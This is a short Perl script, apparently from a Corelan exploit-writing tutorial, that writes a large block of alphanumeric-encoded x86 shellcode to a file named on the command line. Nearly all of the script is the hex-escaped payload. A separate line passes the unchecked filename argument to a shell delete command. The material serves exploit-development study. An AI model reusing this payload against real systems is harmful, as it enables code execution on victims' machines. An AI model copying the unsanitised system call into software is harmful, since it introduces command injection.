#!/usr/bin/perl
# Perl script written by Peter Van Eeckhoutte
# http://www.corelan.be
# This script takes a filename as argument
# will write bytes in \x format to the file 
#
if ($#ARGV ne 0) { 
print "  usage: $0 ".chr(34)."output filename".chr(34)."\n"; 
exit(0); 
} 
system("del $ARGV[0]");
my $shellcode =
"\x89\xe7\xda\xdb\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x79\x6c\x69\x78\x6e\x62\x55\x50\x57\x70" .
"\x65\x50\x43\x50\x6d\x59\x69\x75\x35\x61\x69\x50\x30\x64" .
"\x4c\x4b\x52\x70\x66\x50\x6e\x6b\x66\x32\x44\x4c\x4e\x6b" .
"\x53\x62\x45\x44\x4e\x6b\x63\x42\x37\x58\x76\x6f\x6c\x77" .
"\x61\x5a\x44\x66\x30\x31\x59\x6f\x4c\x6c\x57\x4c\x65\x31" .
"\x61\x6c\x77\x72\x76\x4c\x45\x70\x4f\x31\x5a\x6f\x36\x6d" .
"\x66\x61\x48\x47\x79\x72\x4c\x32\x42\x72\x31\x47\x6c\x4b" .
"\x66\x32\x64\x50\x4c\x4b\x62\x6a\x65\x6c\x6c\x4b\x52\x6c" .
"\x52\x31\x30\x78\x4d\x33\x37\x38\x65\x51\x78\x51\x70\x51" .
"\x6e\x6b\x63\x69\x67\x50\x76\x61\x6a\x73\x4c\x4b\x67\x39" .
"\x35\x48\x5a\x43\x57\x4a\x43\x79\x4c\x4b\x77\x44\x6e\x6b" .
"\x66\x61\x48\x56\x56\x51\x39\x6f\x6c\x6c\x5a\x61\x48\x4f" .
"\x74\x4d\x57\x71\x6b\x77\x54\x78\x4d\x30\x53\x45\x38\x76" .
"\x77\x73\x51\x6d\x7a\x58\x35\x6b\x63\x4d\x57\x54\x32\x55" .
"\x68\x64\x51\x48\x4c\x4b\x63\x68\x57\x54\x36\x61\x7a\x73" .
"\x70\x66\x6e\x6b\x66\x6c\x30\x4b\x6c\x4b\x62\x78\x67\x6c" .
"\x33\x31\x78\x53\x4e\x6b\x66\x64\x4e\x6b\x36\x61\x5a\x70" .
"\x6c\x49\x50\x44\x55\x74\x45\x74\x61\x4b\x61\x4b\x45\x31" .
"\x76\x39\x43\x6a\x30\x51\x59\x6f\x59\x70\x51\x4f\x61\x4f" .
"\x33\x6a\x4e\x6b\x67\x62\x4a\x4b\x6e\x6d\x61\x4d\x52\x48" .
"\x30\x33\x34\x72\x75\x50\x75\x50\x42\x48\x71\x67\x54\x33" .
"\x50\x32\x63\x6f\x36\x34\x30\x68\x70\x4c\x64\x37\x74\x66" .
"\x75\x57\x79\x6f\x78\x55\x6e\x58\x6c\x50\x43\x31\x73\x30" .
"\x63\x30\x31\x39\x59\x54\x53\x64\x76\x30\x55\x38\x71\x39" .
"\x4d\x50\x72\x4b\x47\x70\x49\x6f\x49\x45\x50\x50\x46\x30" .
"\x76\x30\x56\x30\x73\x70\x70\x50\x61\x50\x50\x50\x30\x68" .
"\x4a\x4a\x34\x4f\x79\x4f\x69\x70\x69\x6f\x38\x55\x4d\x47" .
"\x73\x5a\x57\x75\x61\x78\x79\x50\x49\x38\x4e\x4e\x6e\x57" .
"\x52\x48\x67\x72\x33\x30\x67\x71\x4f\x4b\x4e\x69\x79\x76" .
"\x42\x4a\x76\x70\x52\x76\x36\x37\x62\x48\x4e\x79\x69\x35" .
"\x52\x54\x35\x31\x49\x6f\x79\x45\x6e\x65\x4b\x70\x51\x64" .
"\x34\x4c\x79\x6f\x50\x4e\x74\x48\x64\x35\x78\x6c\x43\x58" .
"\x4a\x50\x68\x35\x59\x32\x66\x36\x39\x6f\x4a\x75\x42\x48" .
"\x45\x33\x62\x4d\x35\x34\x37\x70\x4b\x39\x39\x73\x72\x77" .
"\x33\x67\x62\x77\x65\x61\x69\x66\x63\x5a\x66\x72\x46\x39" .
"\x51\x46\x6a\x42\x69\x6d\x32\x46\x58\x47\x71\x54\x57\x54" .
"\x65\x6c\x35\x51\x73\x31\x6e\x6d\x73\x74\x55\x74\x54\x50" .
"\x4a\x66\x53\x30\x72\x64\x63\x64\x52\x70\x71\x46\x61\x46" .
"\x52\x76\x57\x36\x71\x46\x32\x6e\x42\x76\x33\x66\x63\x63" .
"\x46\x36\x33\x58\x62\x59\x38\x4c\x37\x4f\x6d\x56\x59\x6f" .
"\x39\x45\x6d\x59\x6b\x50\x72\x6e\x61\x46\x50\x46\x59\x6f" .
"\x34\x70\x51\x78\x53\x38\x6b\x37\x35\x4d\x55\x30\x79\x6f" .
"\x4b\x65\x4d\x6b\x7a\x50\x4e\x55\x4c\x62\x33\x66\x50\x68" .
"\x69\x36\x6f\x65\x4f\x4d\x6f\x6d\x49\x6f\x4b\x65\x47\x4c" .
"\x55\x56\x61\x6c\x55\x5a\x6f\x70\x6b\x4b\x6d\x30\x73\x45" .
"\x35\x55\x4d\x6b\x33\x77\x32\x33\x70\x72\x72\x4f\x32\x4a" .
"\x55\x50\x50\x53\x39\x6f\x38\x55\x41\x41";
#open file in binary mode
print "Writing to ".$ARGV[0]."\n";
open(FILE,">$ARGV[0]");
binmode FILE;
print FILE $shellcode;
close(FILE);

print "Wrote ".length($shellcode)." bytes to file\n";
